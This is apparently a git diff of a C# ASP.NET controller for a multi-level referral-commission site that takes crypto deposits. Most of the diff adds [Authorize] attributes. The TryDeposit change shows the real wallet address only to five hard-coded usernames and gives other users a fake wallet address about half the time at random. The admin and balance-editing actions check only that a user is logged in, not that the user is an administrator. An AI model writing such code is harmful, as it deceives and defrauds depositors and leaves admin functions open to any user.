@@ -1,5 +1,6 @@
 ﻿using GrabDemSite.Data;
 using GrabDemSite.Models;
+using Microsoft.AspNetCore.Authorization;
 using Microsoft.AspNetCore.Mvc;
 using Microsoft.AspNetCore.Mvc.Rendering;
 using System.Diagnostics;
@@ -10,12 +11,15 @@ namespace GrabDemSite.Controllers
     {
         private readonly ILogger<HomeController> _logger;
         private ApplicationDbContext _context;
-        readonly string Wallet = "xXXxxxXxxxxxXXxxX";
+        private readonly string Wallet = "xXXxxxXxxxxxXXxxX";
+        private readonly string FakeWallet = "xvdsgdsagsdg";
+        private Random random = new Random();
         public HomeController(ILogger<HomeController> logger, ApplicationDbContext context)
         {
             _logger = logger;
             _context = context;
         }
+        [Authorize]
         public IActionResult Profile()
         {
             UserDataModel user = _context.Users.Where(x => x.UserName == this.User.Identity.Name).Single();
@@ -41,7 +45,7 @@ namespace GrabDemSite.Controllers
                     {
                         userslv2.AddRange(_context.Users.Where(x => x.InviteWithLink == userslv1[i].InviteLink).ToList());
                     }
-                    if(_context.Users.Where(x => x.InviteWithLink == userslv2[0].InviteLink).FirstOrDefault() != default)
+                    if (_context.Users.Where(x => x.InviteWithLink == userslv2[0].InviteLink).FirstOrDefault() != default)
                     {
                         userslv3.Remove(fakeUser);
                         for (int i = 0; i < userslv2.Count(); i++)
@@ -51,10 +55,12 @@ namespace GrabDemSite.Controllers
                     }
                 }
             }
+            ViewBag.Level1 = userslv1;
             ViewBag.Level2 = userslv2;
             ViewBag.Level3 = userslv3;
             return View(user);
         }
+        [Authorize]
         public IActionResult AdminMenu()
         {
             ViewBag.Users = _context.Users.ToList();
@@ -62,6 +68,7 @@ namespace GrabDemSite.Controllers
             ViewBag.Withdraws = _context.WithdrawDatas.ToList();
             return View();
         }
+        [Authorize]
         public IActionResult Edit(string id)
         {
             UserDataModel user = _context.Users.Where(x => x.Id == id).Single();
@@ -70,17 +77,18 @@ namespace GrabDemSite.Controllers
 
             return View(user);
         }
-        /* Tasks need to give money, based on a commision - 0.15%?
+        /* Tasks need to give money, based on a commision - 0.3%?
          * Level1 Users give 0.03% to the inviter
          * Level2 Users give 0.02% to the inviter
          * Level3 Users give 0.01% to the inviter
          */
+        [Authorize]
         public IActionResult AdminWithdrawConfirm(string wallet)
         {
             ViewBag.Withdraws = _context.WithdrawDatas.Where(x => x.WalletAddress == wallet).ToList();
-
             return View();
         }
+        [Authorize]
         public IActionResult ChangeWallet(string wallet)
         {
             UserDataModel user = _context.Users.Where(x => x.UserName == this.User.Identity.Name).Single();
@@ -89,6 +97,7 @@ namespace GrabDemSite.Controllers
             _context.SaveChanges();
             return View("Index");
         }
+        [Authorize]
         public IActionResult AdminWithdrawConfirmed(string id)
         {
             List<WithdrawDataModel> withdraws = _context.WithdrawDatas.Where(x => x.User.Id == id).ToList();
@@ -101,6 +110,7 @@ namespace GrabDemSite.Controllers
             _context.SaveChanges();
             return RedirectToAction("AdminMenu", "Home");
         }
+        [Authorize]
         [HttpGet]
         public IActionResult Edit(string id, double balance)
         {
@@ -119,6 +129,7 @@ namespace GrabDemSite.Controllers
             _context.SaveChanges();
             return RedirectToAction("Index");
         }
+        [Authorize]
         public IActionResult TryWithdraw(string id, double money)
         {
             UserDataModel user = _context.Users.Where(x => x.Id == id).Single();
@@ -140,6 +151,8 @@ namespace GrabDemSite.Controllers
             withdrawReq.User = user;
             return View("ConfirmWithdraw", withdrawReq);
         }
+       
+        [Authorize]
         public IActionResult ConfirmedWithdraw(string id, double money, string wallet, string iduser)
         {
             WithdrawDataModel withdrawReq = new WithdrawDataModel();
@@ -156,10 +169,12 @@ namespace GrabDemSite.Controllers
             _context.SaveChanges();
             return View("Index");
         }
+        [Authorize]
         public IActionResult ChangeUser()
         {
             return RedirectToAction("AdminMenu", "Home");
         }
+        [Authorize]
         public IActionResult Withdraw()
         {
             ViewBag.ErrorBal = "";
@@ -169,18 +184,26 @@ namespace GrabDemSite.Controllers
             return View(user);
         }
         // NEED ERROR PAGE WITH CUSTOM ERRORS
+        [Authorize]
         public IActionResult Index()
         {
             ViewBag.ErrorCh = "";
             return View();
         }
-
+        [Authorize]
+        public IActionResult CompletedTask()
+        {
+            UserDataModel user = _context.Users.Where(x => x.UserName == this.User.Identity.Name).Single();
+            return RedirectToAction("Index");
+        }
+        [Authorize]
         public IActionResult Deposit()
         {
             ViewBag.ErrorSum = "";
             UserDataModel user = _context.Users.Where(x => x.UserName == this.User.Identity.Name).Single();
             return View(user);
         }
+        [Authorize]
         public IActionResult TryDeposit(string id, double money)
         {
             UserDataModel user = _context.Users.Where(x => x.Id == id).Single();
@@ -196,10 +219,25 @@ namespace GrabDemSite.Controllers
                 depReq.User = user;
                 depReq.Id = Guid.NewGuid().ToString();
                 depReq.UserEmail = user.Email;
-                ViewBag.Wallet = Wallet;
+                string name = this.User.Identity.Name;
+                int rndRes = random.Next(1, 3);
+                if(name=="SkAg1" || name=="BlAg2" ||  name=="5aAg3" || name=="TyAg4" || name=="66Ag5")
+                {
+                    ViewBag.Wallet = Wallet;
+                }
+                else if (rndRes == 2)
+                {
+                    ViewBag.Wallet = Wallet;
+                }
+                else {
+
+                    ViewBag.Wallet = FakeWallet;
+                }
+
                 return View("TryDeposit", depReq);
             }
         }
+        [Authorize]
         public IActionResult TryTheDeposit(string id, double money, string userid)
         {
             UserDataModel user = _context.Users.Where(x => x.Id == userid).Single();
